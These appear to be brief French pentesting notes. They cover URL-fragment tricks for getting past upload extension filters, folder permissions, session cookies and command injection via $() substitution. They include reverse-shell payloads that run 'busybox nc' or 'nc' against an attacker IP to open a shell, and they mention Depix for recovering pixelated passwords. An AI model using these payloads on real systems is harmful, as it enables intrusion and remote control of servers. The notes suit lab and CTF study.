

Dans un url d'image ou autre du style http://test.com/image.jpg

on peut ajouter n'importe quoi apres en rajoutant un # du genre :

http://test.com/image.jpg#.php

Cela nous renverra vers le lien en ignorant le # et ce qu'il y a derrière.
Il peut donc y avoir une faille, on peut ajouter le # et mettre  #.jpg pour faire croire au serveur s'il est mal configurer que l'extention est en .jpg. Cela peut etre utile dans un formulaire d'upload pour upload un reverse shell.
Ansi cela permet de bypass la secu si celle-ci est mal configuré.


* Penser à regarder les droits des dossiers ! --> possibilité de supprimer/remplacer des fichiers dont on à pas les droits mais qui sont dans le dossier dont on à les droits


Regarder comment sont creer les cookies --> PHPSESSID


on peut executer des commande avec :
* $ (comamand) du genre $(id) == id 

et donc on peur faire ca avec un reverse shell nc 
Explication : La syntaxe `$()` en bash est utilisée pour exécuter une commande à l'intérieur d'une autre commande, puis utiliser la sortie de cette commande dans le contexte externe. Elle est également appelée "command substitution". 

Si cela affiche bien le resultat on peut trouver un bon payload pour exploit. On peut le faire avec la commande busybox qui fait juste la commande qui est apres (`pwd` = `busybox pwd`) soit par exemple : 
* $(busybox nc 10.10.10.10 9001 -e sh)
* & & nc 10.10.10.10 9001 -e sh

Tools --> depix to Depix to recover passwords from pixelized screenshots